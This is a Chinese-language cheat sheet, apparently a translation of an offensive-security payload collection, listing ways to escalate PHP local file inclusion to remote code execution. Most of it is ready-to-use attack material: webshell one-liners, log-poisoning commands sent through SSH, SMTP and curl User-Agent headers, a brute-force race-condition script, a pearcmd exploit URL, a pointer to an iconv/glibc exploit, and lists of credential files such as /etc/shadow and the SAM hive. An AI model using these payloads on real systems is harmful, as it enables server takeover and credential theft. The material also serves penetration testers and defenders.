# 从LFI到RCE的利用方法

> LFI（本地文件包含）是一种Web应用程序漏洞，当应用程序不安全地处理用户输入导致可以包含本地文件系统上的文件时出现。如果攻击者能够控制文件路径，他们可能包含敏感或危险文件，如系统文件（/etc/passwd）、配置文件，甚至是可能导致远程代码执行（RCE）的恶意文件。

## 目录

- [通过/proc/*/fd实现LFI到RCE](#通过proc-fd实现lfi到rce)
- [通过/proc/self/environ实现LFI到RCE](#通过procselfenviron实现lfi到rce)
- [通过iconv实现LFI到RCE](#通过iconv实现lfi到rce)
- [通过文件上传实现LFI到RCE](#通过文件上传实现lfi到rce)
- [通过文件上传竞争条件实现LFI到RCE](#通过文件上传竞争条件实现lfi到rce)
- [通过FindFirstFile实现LFI到RCE](#通过findfirstfile实现lfi到rce)
- [通过phpinfo()实现LFI到RCE](#通过phpinfo实现lfi到rce)
- [通过可控日志文件实现LFI到RCE](#通过可控日志文件实现lfi到rce)
    - [通过SSH实现RCE](#通过ssh实现rce)
    - [通过邮件实现RCE](#通过邮件实现rce)
    - [通过Apache日志实现RCE](#通过apache日志实现rce)
- [通过PHP会话实现LFI到RCE](#通过php会话实现lfi到rce)
- [通过PHP PEARCMD实现LFI到RCE](#通过php-pearcmd实现lfi到rce)
- [通过凭证文件实现LFI到RCE](#通过凭证文件实现lfi到rce)

## 通过/proc/*/fd实现LFI到RCE

1. 上传大量Webshell（例如：100个）
2. 包含`/proc/$PID/fd/$FD`，其中`$PID`是进程ID，`$FD`是文件描述符。两者都可以通过暴力破解获取。

```
http://example.com/index.php?page=/proc/$PID/fd/$FD
```

## 通过/proc/self/environ实现LFI到RCE

与日志文件类似，在`User-Agent`头中发送有效载荷，它会被反射到`/proc/self/environ`文件中。

```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```

## 通过iconv实现LFI到RCE

使用iconv包装器触发glibc中的OOB漏洞（CVE-2024-2961），然后使用LFI从`/proc/self/maps`读取内存区域并下载glibc二进制文件。最后，通过利用`zend_mm_heap`结构调用已重新映射为`system`的`free()`函数来获取RCE。

**要求**：

- PHP 7.0.0 (2015) 到 8.3.7 (2024)
- GNU C 库 (`glibc`) <= 2.39
- 能够访问`convert.iconv`、`zlib.inflate`、`dechunk`过滤器

**利用工具**：

- [ambionics/cnext-exploits](https://github.com/ambionics/cnext-exploits/tree/main)

## 通过文件上传实现LFI到RCE

如果可以上传文件，只需在其中注入Webshell（例如：`<?php system($_GET['c']); ?>`）。

```
http://example.com/index.php?page=path/to/uploaded/file.png
```

为了保持文件可读，最好将代码注入到图片/文档/PDF的元数据中。

## 通过文件上传竞争条件实现LFI到RCE

1. 上传文件并触发自包含。
2. 重复上传多次以：
   - 增加赢得竞争条件的几率
   - 增加猜测的几率
3. 暴力破解包含`/tmp/[0-9a-zA-Z]{6}`
4. 获取shell

```python
import itertools
import requests
import sys

print('[+] 尝试赢得竞争条件')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
    requests.post('http://target.com/index.php?c=index.php', f)


print('[+] 暴力破解包含')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
    url = 'http://target.com/index.php?c=/tmp/php' + fname
    r = requests.get(url)
    if 'load average' in r.text:  # <?php echo system('uptime');
        print('[+] 成功获取shell: ' + url)
        sys.exit(0)

print('[x] 出现错误，请重试')
```

## 通过FindFirstFile实现LFI到RCE

:warning: 仅适用于Windows

`FindFirstFile`允许在Windows上的LFI路径中使用通配符（`<<`作为`*`，`>`作为`?`）。通配符本质上是搜索模式，可以包含通配符，允许用户或开发人员根据部分名称或类型搜索文件或目录。在FindFirstFile的上下文中，通配符用于过滤和匹配文件或目录的名称。

- `*`/`<<` : 表示任意字符序列
- `?`/`>` : 表示任意单个字符

上传文件后，它应该存储在临时文件夹`C:\Windows\Temp\`中，并生成类似`php[A-F0-9]{4}.tmp`的名称。然后，可以暴力破解65536个可能的文件名，或使用通配符，如：`http://site/vuln.php?inc=c:\windows\temp\php<<`

## 通过phpinfo()实现LFI到RCE

PHPinfo()显示任何变量的内容，如**$_GET**、**$_POST**和**$_FILES**。

> 通过向PHPInfo脚本发送多个上传请求，并仔细控制读取，可以检索临时文件的名称，并向LFI脚本发送指定临时文件名的请求。

使用脚本 [phpInfoLFI.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)

## 通过可控日志文件实现LFI到RCE

只需通过向服务（Apache、SSH等）发送请求将PHP代码附加到日志文件中，然后包含该日志文件。

```
http://example.com/index.php?page=/var/log/apache/access.log
http://example.com/index.php?page=/var/log/apache/error.log
http://example.com/index.php?page=/var/log/apache2/access.log
http://example.com/index.php?page=/var/log/apache2/error.log
http://example.com/index.php?page=/var/log/nginx/access.log
http://example.com/index.php?page=/var/log/nginx/error.log
http://example.com/index.php?page=/var/log/vsftpd.log
http://example.com/index.php?page=/var/log/sshd.log
http://example.com/index.php?page=/var/log/mail
http://example.com/index.php?page=/var/log/httpd/error_log
http://example.com/index.php?page=/usr/local/apache/log/error_log
http://example.com/index.php?page=/usr/local/apache2/log/error_log
```

### 通过SSH实现RCE

尝试使用PHP代码作为用户名SSH登录：`<?php system($_GET["cmd"]);?>`。

```
ssh <?php system($_GET["cmd"]);?>@10.10.10.10
```

然后在Web应用程序中包含SSH日志文件。

```
http://example.com/index.php?page=/var/log/auth.log&cmd=id
```

### 通过邮件实现RCE

首先使用开放的SMTP发送电子邮件，然后包含位于`/var/log/mail`的日志文件。

```
telnet 10.10.10.10. 25
Trying 10.10.10.10....
Connected to 10.10.10.10..
Escape character is '^]'.
220 straylight ESMTP Postfix (Debian/GNU)
helo ok
250 straylight
mail from: mail@example.com
250 2.1.0 Ok
rcpt to: root
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
subject: <?php echo system($_GET["cmd"]); ?>
data2
.
```

在某些情况下，您也可以使用`mail`命令行发送电子邮件。

```
mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null
```

### 通过Apache日志实现RCE

污染访问日志中的User-Agent：

```
curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
```

注意：日志会转义双引号，因此在PHP有效载荷中对字符串使用单引号。

然后通过LFI请求日志并执行命令。

```
curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
```

## 通过PHP会话实现LFI到RCE

检查网站是否使用PHP会话（PHPSESSID）

```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```

## 通过PHP PEARCMD实现LFI到RCE

如果服务器上安装了PEAR（PHP扩展和应用程序仓库），并且`register_argc_argv`设置为`On`，则可以通过`pearcmd.php`执行系统命令。

```
http://example.com/index.php?+config-create+/&page=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php
```

然后包含生成的文件：

```
http://example.com/index.php?page=/tmp/hello.php
```

## 通过凭证文件实现LFI到RCE

此方法需要应用程序内的高权限才能读取敏感文件。

### Windows版本

- `C:\Windows\repair\sam`
- `C:\Windows\System32/config/RegBack/*`
- `C:\Windows\repair\system`
- `C:\Windows\repair\software`
- `C:\Windows\repair\security`
- `C:\Windows\System32\config\system`
- `C:\Windows\System32\config\software`
- `C:\Windows\System32\config\security`
- `C:\Windows\System32\config\sam`
- `C:\Windows\System32\config\default`

### Linux/Unix版本

- `/etc/passwd`
- `/etc/shadow`
- `/etc/group`
- `/etc/security/passwd`
- `/etc/master.passwd`
- `/etc/security/opasswd`
- `/etc/security/user`
- `/etc/security/passwd`

---

*最后更新: 2025年6月*
